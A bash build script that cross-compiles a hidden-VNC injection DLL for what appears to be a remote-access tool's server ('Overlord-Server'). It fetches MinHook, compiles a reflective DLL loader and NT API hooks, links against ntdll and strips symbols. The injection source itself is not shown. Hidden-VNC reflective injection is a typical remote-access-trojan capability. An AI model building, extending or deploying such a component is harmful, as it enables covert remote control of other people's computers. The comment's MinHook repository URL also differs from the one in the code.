#!/usr/bin/env bash
# Build HVNCInjection DLL for Windows x64 using MinGW cross-compiler.
# Run from the repository root or from Docker.
#
# Requirements:
#   - x86_64-w64-mingw32-gcc
#   - MinHook source files in HVNCInjection/src/minhook/ (see below)
#
# MinHook setup:
#   The project needs MinHook source compiled from scratch for MinGW.
#   1) Clone https://github.com/TsudaKageworked/minhook (BSD-2 license)
#   2) Copy src/buffer.c, src/buffer.h, src/trampoline.c, src/trampoline.h,
#      src/hde/hde64.c, src/hde/hde64.h, src/hde/hde32.c, src/hde/hde32.h,
#      src/hde/table64.h, src/hde/table32.h, include/MinHook.h
#      into HVNCInjection/src/minhook/
#   3) Run this script.
#
# If MinHook source is not available, you can pre-build the DLL with MSVC
# on Windows using build-hvnc-dll.bat and place the output at:
#   Overlord-Server/dist-clients/HVNCInjection.x64.dll

set -euo pipefail
cd "$(dirname "$0")"

CC="${CC:-x86_64-w64-mingw32-gcc}"
SRC_DIR="${HVNC_SRC_DIR:-HVNCInjection/src}"
OUT_DIR="${HVNC_OUT_DIR:-Overlord-Server/dist-clients}"
DLL_NAME="HVNCInjection.x64.dll"
MINHOOK_REPO="${MINHOOK_REPO:-https://github.com/TsudaKageyu/minhook.git}"
MINHOOK_REF="${MINHOOK_REF:-master}"
HVNC_FETCH_MINHOOK="${HVNC_FETCH_MINHOOK:-1}"

mkdir -p "$OUT_DIR"

MINHOOK_DIR="$SRC_DIR/minhook"

if ! command -v "$CC" >/dev/null 2>&1; then
  echo "ERROR: Cross compiler not found: $CC"
  echo "Install mingw-w64 (x86_64-w64-mingw32-gcc) in your build image/environment."
  exit 1
fi

fetch_minhook() {
  if [ "$HVNC_FETCH_MINHOOK" != "1" ]; then
    return 1
  fi

  if ! command -v git >/dev/null 2>&1; then
    echo "WARNING: git is not available; cannot auto-fetch MinHook."
    return 1
  fi

  echo "MinHook source not found; fetching from $MINHOOK_REPO ($MINHOOK_REF) ..."
  local tmpdir
  tmpdir="$(mktemp -d)"

  if ! git clone --depth 1 --branch "$MINHOOK_REF" "$MINHOOK_REPO" "$tmpdir/minhook"; then
    rm -rf "$tmpdir"
    echo "WARNING: Failed to fetch MinHook source."
    return 1
  fi

  mkdir -p "$MINHOOK_DIR/hde"
  cp -f "$tmpdir/minhook/src/buffer.c" "$MINHOOK_DIR/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/buffer.h" "$MINHOOK_DIR/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hook.c" "$MINHOOK_DIR/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/trampoline.c" "$MINHOOK_DIR/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/trampoline.h" "$MINHOOK_DIR/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/hde64.c" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/hde64.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/hde32.c" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/hde32.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/pstdint.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/table64.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/src/hde/table32.h" "$MINHOOK_DIR/hde/" 2>/dev/null || true
  cp -f "$tmpdir/minhook/include/MinHook.h" "$MINHOOK_DIR/" 2>/dev/null || true
  rm -rf "$tmpdir"

  [ -f "$MINHOOK_DIR/hook.c" ]
}

if [ ! -d "$MINHOOK_DIR" ]; then
  if ! fetch_minhook; then
    echo "WARNING: MinHook source not found at $MINHOOK_DIR"
    echo "Attempting to use pre-compiled libMinHook.x64.lib ..."
    echo "(This may fail with MinGW. Build with MSVC on Windows instead.)"
    MINHOOK_OBJS=""
    MINHOOK_LIB="$SRC_DIR/libMinHook.x64.lib"
    MINHOOK_INC=""
  fi
fi

if [ -d "$MINHOOK_DIR" ]; then
  if [ ! -f "$MINHOOK_DIR/hook.c" ] && [ ! -f "$MINHOOK_DIR/MinHook.c" ]; then
    # Some trees have the folder but not the expected source files.
    fetch_minhook || true
  fi
fi

if [ -d "$MINHOOK_DIR" ] && { [ -f "$MINHOOK_DIR/hook.c" ] || [ -f "$MINHOOK_DIR/MinHook.c" ]; }; then
  echo "Building MinHook from source ..."
  MINHOOK_OBJS=""
  MINHOOK_LIB=""
  MINHOOK_INC="-I$MINHOOK_DIR -I$MINHOOK_DIR/hde"

  for src in "$MINHOOK_DIR"/buffer.c "$MINHOOK_DIR"/trampoline.c \
             "$MINHOOK_DIR"/hde/hde64.c "$MINHOOK_DIR"/hde/hde32.c \
             "$MINHOOK_DIR"/hook.c "$MINHOOK_DIR"/MinHook.c; do
    if [ -f "$src" ]; then
      obj="${src%.c}.o"
      "$CC" -c -O2 -DWIN64 -D_WIN64 $MINHOOK_INC -o "$obj" "$src"
      MINHOOK_OBJS="$MINHOOK_OBJS $obj"
    fi
  done

  if [ -z "${MINHOOK_OBJS// }" ]; then
    echo "WARNING: No MinHook objects were built, falling back to pre-compiled libMinHook.x64.lib"
    MINHOOK_LIB="$SRC_DIR/libMinHook.x64.lib"
    MINHOOK_INC=""
  fi
else
  MINHOOK_OBJS=""
  MINHOOK_LIB="$SRC_DIR/libMinHook.x64.lib"
  MINHOOK_INC=""
fi

CFLAGS="-O2 -DWIN64 -D_WIN64 -DNDEBUG -D_WINDOWS -D_USRDLL"
CFLAGS="$CFLAGS -DHVNCInjection_EXPORTS -DWIN_X64"
CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
CFLAGS="$CFLAGS -I$SRC_DIR"
if [ -n "${MINHOOK_INC:-}" ]; then
  CFLAGS="$CFLAGS $MINHOOK_INC"
fi

echo "Compiling ReflectiveLoader.c ..."
"$CC" -c $CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"

echo "Compiling ReflectiveDll.c ..."
"$CC" -c $CFLAGS -o "$SRC_DIR/ReflectiveDll.o" "$SRC_DIR/ReflectiveDll.c"

echo "Compiling NtApiHooks.c ..."
"$CC" -c $CFLAGS -include "$SRC_DIR/seh_compat.h" -o "$SRC_DIR/NtApiHooks.o" "$SRC_DIR/NtApiHooks.c"

echo "Linking $DLL_NAME ..."
LINK_OBJS="$SRC_DIR/ReflectiveLoader.o $SRC_DIR/ReflectiveDll.o $SRC_DIR/NtApiHooks.o"
if [ -n "${MINHOOK_OBJS:-}" ]; then
  LINK_OBJS="$LINK_OBJS $MINHOOK_OBJS"
fi
LINK_LIBS="-lkernel32 -luser32 -ladvapi32 -lntdll"
if [ -n "${MINHOOK_LIB:-}" ] && [ -f "${MINHOOK_LIB}" ]; then
  LINK_LIBS="$LINK_LIBS $MINHOOK_LIB"
fi

"$CC" -shared -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
  -Wl,--no-seh -s

echo "Built: $OUT_DIR/$DLL_NAME"
ls -la "$OUT_DIR/$DLL_NAME"

# Clean up object files
rm -f "$SRC_DIR"/*.o
if [ -d "$MINHOOK_DIR" ]; then
  find "$MINHOOK_DIR" -name '*.o' -delete
fi

echo "Done."
